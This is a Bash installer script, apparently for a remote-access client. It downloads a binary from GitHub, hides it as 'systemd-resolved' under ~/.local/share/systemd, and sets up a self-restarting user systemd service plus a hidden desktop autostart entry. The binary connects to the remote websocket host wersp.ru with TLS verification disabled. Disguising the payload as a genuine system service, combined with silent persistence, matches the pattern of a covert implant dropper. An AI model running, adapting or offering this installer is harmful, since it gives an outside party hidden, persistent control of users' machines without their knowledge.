
#!/bin/bash

set -e


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BINARY_URL="https://github.com/w9line/File_transfer/raw/1923f96c793437b4bfaba6aa4864acb4c9ec12db/client_linux"
SERVER_URL="wss://wersp.ru/ws/client"
PROXY=""
MODE="auto"
INSECURE=true
SESSION_ID=""
UNINSTALL=false
START_AFTER=false

INSTALL_DIR="$HOME/.local/share/systemd"
SERVICE_DIR="$HOME/.config/systemd/user"
AUTOSTART_DIR="$HOME/.config/autostart"
BINARY_NAME="systemd-resolved"
BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
SERVICE_NAME="systemd-resolved.service"
SERVICE_PATH="$SERVICE_DIR/$SERVICE_NAME"
DESKTOP_PATH="$AUTOSTART_DIR/${BINARY_NAME}.desktop"

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[OK]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_help() {
  cat << EOF
Client Installer Script
=== бебебе
EOF
  exit 0
}

parse_args() {
  while [[ $# -gt 0 ]]; do
    case $1 in
      -b | --binary)
        BINARY_URL="$2"
        shift 2
        ;;
      -u | --url)
        SERVER_URL="$2"
        shift 2
        ;;
      -p | --proxy)
        PROXY="$2"
        shift 2
        ;;
      -m | --mode)
        MODE="$2"
        shift 2
        ;;
      -i | --insecure)
        INSECURE=true
        shift
        ;;
      -s | --session-id)
        SESSION_ID="$2"
        shift 2
        ;;
      --uninstall)
        UNINSTALL=true
        shift
        ;;
      --start)
        START_AFTER=true
        shift
        ;;
      -h | --help) show_help ;;
      *)
        log_error "Unknown option: $1"
        exit 1
        ;;
    esac
  done
}

download_binary() {
  log_info "Скачивание бинарника: $BINARY_URL"

  local temp_binary="$BINARY_PATH.tmp"

  if command -v curl &> /dev/null; then
    curl -fsSL -o "$temp_binary" "$BINARY_URL"
  elif command -v wget &> /dev/null; then
    wget -q -O "$temp_binary" "$BINARY_URL"
  else
    log_error "Не найден curl или wget"
    exit 1
  fi

  chmod +x "$temp_binary"
  mv "$temp_binary" "$BINARY_PATH"
  log_success "Бинарник загружен: $BINARY_PATH"
}

create_service() {
  log_info "Создание systemd"

  mkdir -p "$SERVICE_DIR"

  local cmd="$BINARY_PATH"
  [ "$MODE" != "auto" ] && cmd="$cmd --mode $MODE"
  [ "$INSECURE" = true ] && cmd="$cmd --insecure"
  [ -n "$SESSION_ID" ] && cmd="$cmd --session-id $SESSION_ID"

  local env_proxy=""
  if [ -n "$PROXY" ]; then
    env_proxy="Environment=\"HTTPS_PROXY=http://$PROXY\"
Environment=\"HTTP_PROXY=http://$PROXY\"
Environment=\"https_proxy=http://$PROXY\"
Environment=\"http_proxy=http://$PROXY\""
  fi

  cat > "$SERVICE_PATH" << EOF
[Unit]
Description=Systemd Resolved
After=network.target

[Service]
Type=simple
$env_proxy
ExecStart=$cmd
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
EOF

  log_success "Сервис создан: $SERVICE_PATH"
}

create_autostart() {
  log_info "Создание автозапуска (desktop)"

  mkdir -p "$AUTOSTART_DIR"

  local cmd="$BINARY_PATH --server $SERVER_URL"
  [ "$MODE" != "auto" ] && cmd="$cmd --mode $MODE"
  [ "$INSECURE" = true ] && cmd="$cmd --insecure"
  [ -n "$SESSION_ID" ] && cmd="$cmd --session-id $SESSION_ID"

  local proxy_prefix=""
  if [ -n "$PROXY" ]; then
    proxy_prefix="env HTTPS_PROXY=http://$PROXY HTTP_PROXY=http://$PROXY https_proxy=http://$PROXY http_proxy=http://$PROXY "
  fi

  cat > "$DESKTOP_PATH" << EOF
[Desktop Entry]
Type=Application
Name=Systemd Resolved
Exec=${proxy_prefix}$cmd
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

  log_success "Autostart создан: $DESKTOP_PATH"
}

enable_service() {
  log_info "Включение сервиса"

  systemctl --user daemon-reload
  systemctl --user enable "$SERVICE_NAME"
  systemctl --user start "$SERVICE_NAME"

  log_success "Сервис запущен"
}

do_uninstall() {
  log_info "Удаление клиента"

  systemctl --user stop "$SERVICE_NAME" 2> /dev/null || true
  systemctl --user disable "$SERVICE_NAME" 2> /dev/null || true

  rm -f "$SERVICE_PATH"
  rm -f "$DESKTOP_PATH"
  rm -f "$BINARY_PATH"
  rm -rf "$INSTALL_DIR"

  systemctl --user daemon-reload

  log_success "Клиент удален"
}

verify_installation() {
  log_info "Проверка установки"

  if systemctl --user is-active --quiet "$SERVICE_NAME"; then
    log_success "Сервис активен"
  else
    log_warning "Сервис не активен (проверьте логи: journalctl --user -u $SERVICE_NAME)"
  fi
}

main() {
  parse_args "$@"

  if [ "$UNINSTALL" = true ]; then
    do_uninstall
    exit 0
  fi

  if [ -z "$BINARY_URL" ]; then
    log_error "Не указан URL бинарника (-b/--binary)"
    exit 1
  fi

  log_info "=================="

  mkdir -p "$INSTALL_DIR"

  download_binary
  create_service
  create_autostart
  enable_service
  verify_installation

  log_success "Установка завершена!"
  log_info "Логи: journalctl --user -u $SERVICE_NAME -f"
  log_info "Статус: systemctl --user status $SERVICE_NAME"

  if [ "$START_AFTER" = true ]; then
    log_info "Запуск клиента..."
  fi
}

main "$@"
